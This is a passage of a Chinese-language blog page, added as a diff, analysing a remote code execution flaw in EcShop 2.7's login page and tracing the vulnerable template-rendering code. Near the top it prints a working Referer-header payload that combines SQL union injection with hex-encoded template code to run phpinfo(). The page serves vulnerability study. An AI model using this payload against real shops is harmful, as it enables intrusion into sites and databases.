@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
+    
+    <title>
+        
+            EcShop2.7RCE |
+        
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Today's matter, today's end."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">EcShop2.7RCE</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2021-01-25 10:57:03
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>起因是想学习一下，PHP写的cms在进行模板渲染的时候，造成RCE问题</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ecshop&#x2F;upload&#x2F;user.php?act&#x3D;login</span><br><span class="line"></span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:84:&quot;*&#x2F;union select 1,0x272f2a,4,4,5,6,7,8,0x7b24275d3b706870696e666f2f2a2a2f28292f2f7d,0&quot;;s:2:&quot;id&quot;;s:3:&quot;&#39;&#x2F;*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca|a:2:&#123;s:3:&quot;num&quot;;s:68:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/01/25/EcShop2-7RCE/G:%5CBlog%5Cblog%5Csource_posts%5CEcShop2-7RCE%5C1.png" alt="1"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的触发点在upload/user.php中的325行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;back_act&#x27;</span>, <span class="variable">$back_act</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;user_passport.dwt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>整个代码是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$action</span> == <span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$back_act</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$back_act</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;_SERVER&#x27;</span>][<span class="string">&#x27;HTTP_REFERER&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$back_act</span> = strpos(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;_SERVER&#x27;</span>][<span class="string">&#x27;HTTP_REFERER&#x27;</span>], <span class="string">&#x27;user.php&#x27;</span>) ? <span class="string">&#x27;./index.php&#x27;</span> : <span class="variable">$GLOBALS</span>[<span class="string">&#x27;_SERVER&#x27;</span>][<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$back_act</span> = <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$captcha</span> = intval(<span class="variable">$_CFG</span>[<span class="string">&#x27;captcha&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$captcha</span> &amp; CAPTCHA_LOGIN) &amp;&amp; (!(<span class="variable">$captcha</span> &amp; CAPTCHA_LOGIN_FAIL) || ((<span class="variable">$captcha</span> &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_fail&#x27;</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="string">&#x27;enabled_captcha&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="string">&#x27;rand&#x27;</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;back_act&#x27;</span>, <span class="variable">$back_act</span>);</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;user_passport.dwt&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>往前回溯看action是否可控</p>
+<p>前面包含了，初始化文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/includes/init.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>这里面有一个过滤处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 对用户传入的变量进行转义操作。*/</span></span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_GET</span>  = addslashes_deep(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_POST</span> = addslashes_deep(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_COOKIE</span>   = addslashes_deep(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span>  = addslashes_deep(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>back_act变量是从_SERVER中拿到的，不受过滤影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;_SERVER&#x27;</span>][<span class="string">&#x27;HTTP_REFERER&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+<p>action完全可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$action</span>  = <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) ? trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) : <span class="string">&#x27;default&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>跟进assgin方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 注册变量</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   mix      $tpl_var</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   mix      $value</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$tpl_var</span>, <span class="variable">$value</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$tpl_var</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tpl_var</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$key</span> != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_var[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$tpl_var</span> != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[<span class="variable">$tpl_var</span>] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>非常典型的一个给变量赋值，如果是数组就遍历数组赋值，否则直接赋值</p>
+<p>传给assign方法的参数是 ‘back_act’, $back_act  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;_var[$tpl_var] &#x3D; $value;</span><br></pre></td></tr></table></figure>
+<p>$this-&gt;_var[back_act]  这样就赋值了</p>
+<p>下面会进入display方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;user_passport.dwt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>参数不可控，是一个模板文件，在upload/includes/themes/default/目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;td&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">&lt;td align=<span class="string">&quot;left&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;act&quot;</span> value=<span class="string">&quot;act_login&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;back_act&quot;</span> value=<span class="string">&quot;<span class="subst">&#123;$back_act&#125;</span>&quot;</span> /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;&quot; class=&quot;us_Submit&quot; /&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里有个可以渲染的变量  {$back_act}</p>
+<p>跟进display方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示页面函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   string      $filename</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   sting      $cache_id</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$cache_id</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_checkfile = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$out</span> = <span class="keyword">$this</span>-&gt;fetch(<span class="variable">$filename</span>, <span class="variable">$cache_id</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$out</span>, <span class="keyword">$this</span>-&gt;_echash) !== <span class="literal">false</span>)<span class="comment">//这个会检测out中有没有_echash， _echash在类中已经定义  var $_echash        = &#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;;</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$k</span> = explode(<span class="keyword">$this</span>-&gt;_echash, <span class="variable">$out</span>);<span class="comment">//根据_echash把out拆分成数组</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$k</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)<span class="comment">//遍历数组</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$key</span> % <span class="number">2</span>) == <span class="number">1</span>)<span class="comment">//余数为1，这里的key是0 1这种普通数组，所以会把第二个值传入insert_mod方法中</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$k</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;insert_mod(<span class="variable">$val</span>);<span class="comment">//重点在这，看一下</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$out</span> = implode(<span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>);<span class="comment">//把k中的内容，根据&#x27;&#x27;连成一个字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$out</span>;<span class="comment">//把out输出</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>调用了fetch方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理模板文件</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   string      $filename</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   sting      $cache_id</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  sring</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$cache_id</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp(<span class="variable">$filename</span>,<span class="string">&#x27;str:&#x27;</span>, <span class="number">4</span>) == <span class="number">0</span>)<span class="comment">//filename不可控，跳过，并且前4个字符不是str: 相减不等于0</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$out</span> = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr(<span class="variable">$filename</span>, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_checkfile)<span class="comment">//_checkfile是false，跳过</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!file_exists(<span class="variable">$filename</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//进入，设置文件路径</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;direct_output)<span class="comment">//默认是false，跳过</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_current_file = <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$out</span> = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(file_get_contents(<span class="variable">$filename</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$cache_id</span> &amp;&amp; <span class="keyword">$this</span>-&gt;caching)<span class="comment">//缓存中存在，直接调用缓存</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$out</span> = <span class="keyword">$this</span>-&gt;template_out;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!in_array(<span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;template))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;template[] = <span class="variable">$filename</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$out</span> = <span class="keyword">$this</span>-&gt;make_compiled(<span class="variable">$filename</span>);<span class="comment">//编译模板</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$cache_id</span>)<span class="comment">//没有给cache_id传参数,直接就到了最后的return  把模板返回</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$cachename</span> = basename(<span class="variable">$filename</span>, strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>)) . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$cache_id</span>;</span><br><span class="line">                        <span class="variable">$data</span> = serialize(<span class="keyword">array</span>(<span class="string">&#x27;template&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;template, <span class="string">&#x27;expires&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime + <span class="keyword">$this</span>-&gt;cache_lifetime, <span class="string">&#x27;maketime&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime));</span><br><span class="line">                        <span class="variable">$out</span> = str_replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$out</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span> (strpos(<span class="variable">$out</span>, <span class="string">&quot;\n\n&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="variable">$out</span> = str_replace(<span class="string">&quot;\n\n&quot;</span>, <span class="string">&quot;\n&quot;</span>, <span class="variable">$out</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$hash_dir</span> = <span class="keyword">$this</span>-&gt;cache_dir . <span class="string">&#x27;/&#x27;</span> . substr(md5(<span class="variable">$cachename</span>), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!is_dir(<span class="variable">$hash_dir</span>))</span><br><span class="line">                        &#123;</span><br><span class="line">                            mkdir(<span class="variable">$hash_dir</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (file_put_contents(<span class="variable">$hash_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$cachename</span> . <span class="string">&#x27;.php&#x27;</span>, <span class="string">&#x27;&lt;?php exit;?&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="variable">$out</span>, LOCK_EX) === <span class="literal">false</span>)<span class="comment">//这里写入了exit 没法绕过</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            trigger_error(<span class="string">&#x27;can\&#x27;t write:&#x27;</span> . <span class="variable">$hash_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$cachename</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;template = <span class="keyword">array</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span 